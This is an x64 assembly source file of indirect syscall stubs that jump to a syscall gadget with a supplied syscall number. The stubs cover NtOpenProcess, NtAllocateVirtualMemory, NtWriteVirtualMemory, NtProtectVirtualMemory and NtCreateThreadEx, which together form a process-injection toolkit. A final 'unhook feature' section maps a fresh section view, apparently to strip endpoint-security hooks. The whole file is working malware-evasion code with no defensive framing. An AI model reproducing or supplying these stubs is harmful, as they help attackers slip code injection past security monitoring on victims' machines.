.code

; ==============================================================================
; Indirect Syscall Stubs - Gadget-Based Approach
; All stubs: (gadget, ssn, arg1, arg2, ...) -> jmp to syscall;ret gadget
; ==============================================================================

; ---- NtClose (1 arg) ----
SysNtClose PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    jmp r11
SysNtClose ENDP

; ---- NtOpenProcess (4 args) ----
SysNtOpenProcess PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    jmp r11
SysNtOpenProcess ENDP

; ---- NtAllocateVirtualMemory (6 args) ----
SysNtAllocateVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]
    mov [rsp+30h], rcx
    jmp r11
SysNtAllocateVirtualMemory ENDP

; ---- NtFreeVirtualMemory (4 args) ----
SysNtFreeVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    jmp r11
SysNtFreeVirtualMemory ENDP

; ---- NtProtectVirtualMemory (5 args) ----
SysNtProtectVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    jmp r11
SysNtProtectVirtualMemory ENDP

; ---- NtWriteVirtualMemory (5 args) ----
SysNtWriteVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    jmp r11
SysNtWriteVirtualMemory ENDP

; ---- NtReadVirtualMemory (5 args) ----
SysNtReadVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    jmp r11
SysNtReadVirtualMemory ENDP

; ---- NtQueryVirtualMemory (6 args) ----
SysNtQueryVirtualMemory PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]
    mov [rsp+30h], rcx
    jmp r11
SysNtQueryVirtualMemory ENDP

; ---- NtCreateThreadEx (11 args) ----
SysNtCreateThreadEx PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    ; Shift 7 stack args
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]
    mov [rsp+30h], rcx
    mov rcx, [rsp+48h]
    mov [rsp+38h], rcx
    mov rcx, [rsp+50h]
    mov [rsp+40h], rcx
    mov rcx, [rsp+58h]
    mov [rsp+48h], rcx
    mov rcx, [rsp+60h]
    mov [rsp+50h], rcx
    mov rcx, [rsp+68h]
    mov [rsp+58h], rcx
    jmp r11
SysNtCreateThreadEx ENDP

; ---- NtWaitForSingleObject (3 args) ----
SysNtWaitForSingleObject PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    jmp r11
SysNtWaitForSingleObject ENDP

; ---- NtDelayExecution (2 args) ----
SysNtDelayExecution PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    jmp r11
SysNtDelayExecution ENDP

; ---- NtQueryInformationProcess (5 args) ----
SysNtQueryInformationProcess PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    mov r9, [rsp+30h]
    mov rcx, [rsp+38h]
    mov [rsp+28h], rcx
    jmp r11
SysNtQueryInformationProcess ENDP

; ---- NtOpenProcessToken (3 args) ----
SysNtOpenProcessToken PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp+28h]
    jmp r11
SysNtOpenProcessToken ENDP

; ---- NtTerminateProcess (2 args) ----
SysNtTerminateProcess PROC
    mov r11, rcx
    mov rax, rdx
    mov r10, r8
    mov rdx, r9
    jmp r11
SysNtTerminateProcess ENDP

; ==============================================================================
; UNHOOK FEATURE SYSCALLS
; ==============================================================================

; ---- NtOpenSection (3 args) ----
; NtOpenSection(SectionHandle, DesiredAccess, ObjectAttributes)
SysNtOpenSection PROC
    mov r11, rcx                    ; gadget
    mov rax, rdx                    ; ssn
    mov r10, r8                     ; SectionHandle (arg1)
    mov rdx, r9                     ; DesiredAccess (arg2)
    mov r8, [rsp+28h]               ; ObjectAttributes (arg3)
    jmp r11
SysNtOpenSection ENDP

; ---- NtMapViewOfSection (10 args) ----
; NtMapViewOfSection(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, 
;                    CommitSize, SectionOffset, ViewSize, InheritDisposition,
;                    AllocationType, Win32Protect)
SysNtMapViewOfSection PROC
    mov r11, rcx                    ; gadget
    mov rax, rdx                    ; ssn
    mov r10, r8                     ; SectionHandle (arg1)
    mov rdx, r9                     ; ProcessHandle (arg2)
    mov r8, [rsp+28h]               ; BaseAddress (arg3)
    mov r9, [rsp+30h]               ; ZeroBits (arg4)
    ; Shift 6 stack args: 5-10 -> positions 5-10
    mov rcx, [rsp+38h]              ; CommitSize -> [rsp+28h]
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]              ; SectionOffset -> [rsp+30h]
    mov [rsp+30h], rcx
    mov rcx, [rsp+48h]              ; ViewSize -> [rsp+38h]
    mov [rsp+38h], rcx
    mov rcx, [rsp+50h]              ; InheritDisposition -> [rsp+40h]
    mov [rsp+40h], rcx
    mov rcx, [rsp+58h]              ; AllocationType -> [rsp+48h]
    mov [rsp+48h], rcx
    mov rcx, [rsp+60h]              ; Win32Protect -> [rsp+50h]
    mov [rsp+50h], rcx
    jmp r11
SysNtMapViewOfSection ENDP

; ---- NtUnmapViewOfSection (2 args) ----
; NtUnmapViewOfSection(ProcessHandle, BaseAddress)
SysNtUnmapViewOfSection PROC
    mov r11, rcx                    ; gadget
    mov rax, rdx                    ; ssn
    mov r10, r8                     ; ProcessHandle (arg1)
    mov rdx, r9                     ; BaseAddress (arg2)
    jmp r11
SysNtUnmapViewOfSection ENDP

end
